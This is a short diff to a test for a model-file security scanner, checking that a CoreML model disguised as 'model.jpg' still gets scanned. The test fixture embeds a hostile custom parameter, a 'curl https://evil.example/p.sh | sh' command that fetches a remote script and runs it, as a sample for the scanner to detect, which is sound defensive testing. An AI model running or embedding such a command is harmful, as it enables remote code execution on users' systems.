@@ -254,11 +254,12 @@ class TestDirectoryFileFiltering:
 
     def test_disguised_malicious_coreml_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
         """Directory scans should preserve structurally recognized renamed CoreML payloads."""
-        create_mock_coreml(
+        disguised_coreml = create_mock_coreml(
             tmp_path / "model.jpg",
             custom_class="EvilRuntimeLayer",
             custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
         )
+        disguised_coreml.write_bytes(b"\x9a\x06\x03pad" + disguised_coreml.read_bytes())
 
         results = scan_model_directory_or_file(str(tmp_path))
 
